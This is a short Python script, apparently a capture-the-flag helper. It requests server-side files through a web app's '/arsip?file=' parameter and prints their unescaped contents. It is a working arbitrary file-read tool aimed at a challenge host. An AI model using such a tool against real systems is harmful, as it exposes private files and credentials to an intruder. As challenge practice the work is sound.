#!/usr/bin/env python3
"""Dump raw (unescaped) content of /arsip?file=<path>."""
import html
import re
import sys
import urllib.parse

BASE = "https://naples-division-mary-compounds.trycloudflare.com"


def get_raw(path):
    import urllib.error
    import urllib.request

    r = urllib.request.Request(BASE + path)
    r.add_header("User-Agent", "ctf")
    try:
        resp = urllib.request.urlopen(r, timeout=30)
        return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


for path in sys.argv[1:]:
    code, raw = get_raw("/arsip?file=" + urllib.parse.quote(path, safe=""))
    pre = re.findall(r"(?s)<pre[^>]*>(.*?)</pre>", raw)
    out = "\n".join(html.unescape(p) for p in pre) if pre else re.sub(r"(?s)<[^>]+>", "", raw)
    print(f"########## [{code}] {path} ##########")
    print(out.strip())
    print()
